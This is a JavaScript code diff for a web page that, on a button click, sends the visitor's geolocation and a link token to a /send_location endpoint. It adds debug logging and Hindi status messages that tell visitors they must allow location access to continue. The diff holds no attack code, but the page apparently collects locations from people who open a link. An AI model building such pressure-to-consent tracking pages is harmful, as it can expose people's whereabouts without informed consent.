@@ -34,21 +34,28 @@ document.getElementById("btnLoc").addEventListener("click", ()=>{
         fetch("/send_location", {
           method: "POST",
           headers: {"Content-Type": "application/json"},
-          body: JSON.stringify({ token, lat: pos.coords.latitude, lon: pos.coords.longitude })
+          body: JSON.stringify({ 
+            token, 
+            lat: pos.coords.latitude, 
+            lon: pos.coords.longitude 
+          })
         })
         .then(res => res.json())
         .then(data => {
+          console.log("Server response:", data); // Debug log
           if (data.status === "sent") {
             msg.innerText = "✅ Location भेज दी गई है।";
           } else {
-            msg.innerText = "⚠️ Location भेजने में दिक्कत आई।";
+            msg.innerText = "⚠️ Location भेजने में दिक्कत आई: " + data.status;
           }
         })
         .catch(err => {
+          console.error("Fetch error:", err);
           msg.innerText = "❌ Error: " + err;
         });
       },
       err => {
+        console.error("Geo error:", err);
         msg.innerText = "❌ आपने अनुमति deny कर दी है। Allow करें तभी आगे बढ़ सकते हैं।\nअगर allow option नहीं दिख रहा तो लिंक दोबारा खोलें, और फिर भी न हो तो browser data clear करें।";
       },
       {timeout: 5000}
